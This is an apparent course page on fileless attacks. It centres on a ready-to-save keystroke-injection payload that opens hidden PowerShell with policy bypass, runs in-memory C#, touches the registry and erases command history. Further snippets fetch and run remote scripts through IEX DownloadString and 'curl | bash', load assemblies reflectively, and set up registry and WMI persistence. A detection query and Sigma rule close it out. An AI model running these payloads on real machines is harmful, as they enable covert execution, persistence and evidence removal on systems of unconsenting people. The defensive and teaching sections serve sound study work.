# FZ-E02: Fileless Attack

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-E02 |
| **Name** | Fileless Attack |
| **Difficulty** | Expert |
| **Target OS** | Windows 10/11 |
| **Focus** | Memory-only execution |
| **MITRE ATT&CK** | T1059.001, T1055, T1620 |

## What This Payload Does

Executes an attack chain entirely in memory without writing files to disk. Uses PowerShell reflection, .NET assembly loading, and registry storage to avoid file-based detection.

---

## Understanding Fileless Attacks

```
┌─────────────────────────────────────────────────────────────┐
│              TRADITIONAL vs FILELESS ATTACK                  │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│   TRADITIONAL:                   FILELESS:                   │
│   ────────────                   ─────────                   │
│   Download malware.exe           PowerShell in memory        │
│   Write to disk                  No files created            │
│   Execute from disk              Execute from memory         │
│   Creates file artifacts         Memory-only artifacts       │
│   Detected by file AV            Harder to detect            │
│                                                               │
│   DETECTION:                     DETECTION:                  │
│   • File scanning                • Behavior analysis         │
│   • Hash matching                • Memory scanning           │
│   • File system monitoring       • Script logging            │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

---

## The Payload

```ducky
REM =============================================
REM EXPERT: Fileless Attack
REM Target: Windows 10/11
REM Focus: Memory-only execution
REM Skill: Expert
REM WARNING: Advanced technique demonstration
REM =============================================

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -nop
ENTER
DELAY 1500

REM === FILELESS TECHNIQUE 1: In-Memory Script Execution ===
STRINGLN # All operations in memory - no disk writes

REM Define payload as variable (never written to file)
STRINGLN $payload = {
STRINGLN   $info = @{
STRINGLN     Hostname = $env:COMPUTERNAME
STRINGLN     User = $env:USERNAME
STRINGLN     Time = Get-Date
STRINGLN   }
STRINGLN   return $info
STRINGLN }

REM Execute in memory
STRINGLN $result = & $payload

REM === FILELESS TECHNIQUE 2: .NET Reflection ===
STRINGLN # Load and execute .NET code without touching disk

STRINGLN $code = @'
STRINGLN using System;
STRINGLN public class MemoryExec {
STRINGLN   public static string Run() {
STRINGLN     return Environment.MachineName + " - " + DateTime.Now.ToString();
STRINGLN   }
STRINGLN }
STRINGLN '@

STRINGLN # Compile in memory
STRINGLN Add-Type -TypeDefinition $code -Language CSharp
STRINGLN $memResult = [MemoryExec]::Run()

REM === FILELESS TECHNIQUE 3: Registry Storage ===
STRINGLN # Store data in registry instead of files
STRINGLN $regPath = "HKCU:\Software\Microsoft\Windows"
STRINGLN Set-ItemProperty -Path $regPath -Name "UpdateData" -Value $memResult -Type String

REM Retrieve later
STRINGLN $stored = (Get-ItemProperty -Path $regPath -Name "UpdateData").UpdateData

REM Clean up
STRINGLN Remove-ItemProperty -Path $regPath -Name "UpdateData" -ErrorAction SilentlyContinue

REM === FILELESS TECHNIQUE 4: WMI Storage ===
STRINGLN # Create WMI class for data storage (persistent but fileless)
STRINGLN # This is a demonstration - actual creation requires more code

REM === CLEANUP: Remove all traces ===
STRINGLN Remove-Variable payload,result,code,memResult,stored -Force -ErrorAction SilentlyContinue
STRINGLN [GC]::Collect()
STRINGLN Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
STRINGLN exit
```

---

## Fileless Techniques Deep Dive

### 1. In-Memory Script Blocks

```powershell
# Define as scriptblock
$script = {
    # Your code here
    Get-Process | Select-Object -First 5
}

# Execute without file
$output = & $script

# Or invoke
$output = Invoke-Command -ScriptBlock $script
```

### 2. Remote Script Loading (No Local File)

```powershell
# Download and execute in memory
IEX (New-Object Net.WebClient).DownloadString('https://server/script.ps1')

# Alternative using Invoke-Expression
$code = (Invoke-WebRequest -Uri 'https://server/script.ps1' -UseBasicParsing).Content
Invoke-Expression $code
```

### 3. .NET Assembly Reflection

```powershell
# Load assembly from bytes (no file)
$bytes = [System.Convert]::FromBase64String("BASE64_ENCODED_ASSEMBLY")
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Invoke method
$type = $assembly.GetType("Namespace.ClassName")
$method = $type.GetMethod("MethodName")
$method.Invoke($null, @())
```

### 4. Registry-Based Persistence

```powershell
# Store encoded payload in registry
$payload = "IEX (Get-Command)..."
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{random}" -Name "Data" -Value $encoded

# Execution trigger
$stored = (Get-ItemProperty "HKCU:\Software\Classes\CLSID\{random}").Data
$decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($stored))
IEX $decoded
```

### 5. WMI Persistence (Fileless)

```powershell
# Create WMI event subscription (persists reboot, no files)
$filterName = "SystemCheck"
$consumerName = "SystemUpdater"
$payload = "powershell -w hidden -c 'YOUR_CODE'"

# Create filter (trigger)
$wmiParams = @{
    Namespace = "root\subscription"
    Class = "CommandLineEventConsumer"
    Name = $consumerName
    CommandLineTemplate = $payload
}
Set-WmiInstance @wmiParams

# Binding and filter creation would follow
# This creates persistent execution without files
```

---

## Cross-Platform Fileless

### macOS Fileless

```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
REM Execute from variable, no file
STRINGLN CODE='echo "Fileless: $(hostname)"'
STRINGLN eval "$CODE"
STRINGLN unset CODE

REM Or via curl without saving
STRINGLN curl -s https://server/script.sh | bash

REM Python in-memory
STRINGLN python3 -c "import os; print('Fileless:', os.uname().nodename)"
```

### Linux Fileless

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
REM Bash heredoc execution (no file)
STRINGLN bash << 'EOF'
STRINGLN echo "Fileless execution"
STRINGLN hostname
STRINGLN EOF

REM Process injection concept
STRINGLN PAYLOAD='echo test'
STRINGLN eval "$PAYLOAD"
STRINGLN unset PAYLOAD

REM memfd_create based execution (advanced)
REM Would require compiled code
```

---

## Detection Challenges

### Why Fileless is Hard to Detect

| Challenge | Reason |
|-----------|--------|
| No file hash | Can't signature match |
| No disk artifact | File monitoring ineffective |
| Memory volatile | Evidence disappears |
| Living off land | Uses trusted tools |
| Obfuscation | Code varies each time |

### Detection Opportunities

| Method | Indicator |
|--------|-----------|
| Script Block Logging | PowerShell code captured |
| ETW Tracing | API calls logged |
| Memory Scanning | Runtime code analysis |
| Behavior Analysis | Suspicious patterns |
| Network Monitoring | Download before execution |

---

## Red Team Perspective

### Fileless Attack Advantages

1. **Evasion**: No files for AV to scan
2. **Stealth**: Minimal forensic artifacts
3. **Speed**: No disk I/O delay
4. **Flexibility**: Dynamic payload generation

### Fileless Attack Chain

```
PowerShell → Download Code → Memory Execution → Registry Persistence → WMI Trigger
     │              │               │                 │                    │
     No file     No file        No file           No file              No file
```

---

## Blue Team Perspective

### Detection Strategy

```powershell
# Enable comprehensive logging
# Group Policy: Enable Script Block Logging
# Group Policy: Enable Module Logging

# Monitor for fileless indicators
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    Id=4104
} -MaxEvents 500 | Where-Object {
    $_.Message -match 'FromBase64String|Assembly::Load|IEX|Invoke-Expression|DownloadString|Net.WebClient'
} | Select TimeCreated, @{N='Script';E={$_.Message.Substring(0,400)}}
```

### Sigma Rule

```yaml
title: Fileless Attack Indicators
status: experimental
description: Detects common fileless attack patterns
logsource:
    product: windows
    category: ps_script
detection:
    selection_memory:
        ScriptBlockText|contains:
            - 'Assembly::Load'
            - 'FromBase64String'
            - 'Reflection.Assembly'
    selection_download:
        ScriptBlockText|contains:
            - 'DownloadString'
            - 'Invoke-Expression'
            - 'IEX'
    selection_wmi:
        ScriptBlockText|contains:
            - 'CommandLineEventConsumer'
            - 'WMI'
            - '__EventFilter'
    condition: selection_memory or selection_download or selection_wmi
level: high
tags:
    - attack.execution
    - attack.t1059.001
    - attack.defense_evasion
```

---

## Practice Exercises

### Exercise 1: Memory-Only Script
Write a script that collects system info without any file writes.

### Exercise 2: Registry Storage
Store and retrieve data using only registry operations.

### Exercise 3: Detect Fileless
Create a detection query for fileless techniques.

---

## Payload File

Save as `FZ-E02_Fileless_Attack.txt`:

```ducky
REM FZ-E02: Fileless Attack
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -nop
ENTER
DELAY 1500
STRINGLN $p={$env:COMPUTERNAME+$env:USERNAME};$r=&$p;$c='using System;public class M{public static string R(){return Environment.MachineName;}}';Add-Type $c;$x=[M]::R();Remove-Variable p,r,c,x -Force;[GC]::Collect();exit
```

---

[← FZ-E01 OPSEC Payload](FZ-E01_OPSEC_Payload.md) | [Back to Expert](README.md) | [Next: FZ-E03 C2 Framework →](FZ-E03_C2_Framework.md)
